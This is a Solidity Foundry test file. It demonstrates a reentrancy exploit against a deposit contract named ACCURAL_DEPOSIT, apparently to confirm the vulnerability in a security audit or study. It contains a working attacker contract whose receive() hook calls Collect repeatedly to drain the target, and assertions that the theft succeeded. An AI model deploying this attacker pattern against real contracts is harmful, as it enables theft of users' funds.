// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x4320e6f8c05b27ab4707cd1f6d5ce6f3e4b3a5a1.sol";

contract ReentrancyAttacker {
    ACCURAL_DEPOSIT public target;
    uint256 public constant amount = 1 ether;

    constructor(ACCURAL_DEPOSIT _target) {
        target = _target;
    }

    function deposit() external payable {
        target.Deposit{value: amount}();
    }

    function attack() external {
        target.Collect(amount);
    }

    receive() external payable {
        if (address(target).balance >= amount) {
            target.Collect(amount);
        }
    }
}

contract ACCURAL_DEPOSIT_Reentrancy_Test is Test {
    ACCURAL_DEPOSIT public depositContract;
    LogFile public logFile;

    function setUp() public {
        logFile = new LogFile();
        depositContract = new ACCURAL_DEPOSIT();

        depositContract.SetLogFile(address(logFile));
        depositContract.SetMinSum(1);

        vm.deal(address(this), 1 ether);
        depositContract.Deposit{value: 1 ether}();
    }

    function testReentrancyAttack() public {
        ReentrancyAttacker attacker = new ReentrancyAttacker(depositContract);
        vm.deal(address(attacker), 1 ether);
        
        // Attacker deposits using its own balance
        attacker.deposit();
        
        // Capture pre-attack balances
        console.log("--- BEFORE-Trigger state ---");
        uint256 contractBalanceBefore = address(depositContract).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        console.log("Deposit contract ETH balance:", contractBalanceBefore);
        console.log("Attacker ETH balance:", attackerBalanceBefore);

        // Execute the attack
        console.log("--- Trigger: attack ---");
        attacker.attack();

        // Capture post-attack balances
        console.log("--- AFTER-Trigger state ---");
        uint256 contractBalanceAfter = address(depositContract).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        console.log("Deposit contract ETH balance:", contractBalanceAfter);
        console.log("Attacker ETH balance:", attackerBalanceAfter);

        // Verify state changes
        uint256 contractLoss = contractBalanceBefore - contractBalanceAfter;
        uint256 attackerGain = attackerBalanceAfter - attackerBalanceBefore;
        console.log("Contract balance change: -%d ETH", contractLoss / 1e18);
        console.log("Attacker balance change: +%d ETH", attackerGain / 1e18);
        
        // Original assertions retained for test validity
        assertEq(contractBalanceAfter, 0, "Contract should be drained");
        assertEq(attackerBalanceAfter, 2 ether, "Attacker should gain 2 ether");
        
        // Vulnerability verdict
        if (contractBalanceAfter == 0 && attackerBalanceAfter == 2 ether) {
            console.log("Vulnerability Exists: Reentrancy attack succeeded, contract drained and attacker gained unauthorized funds");
        } else {
            console.log("Vulnerability not Exist: Contract balances not changed as expected");
        }
    }
}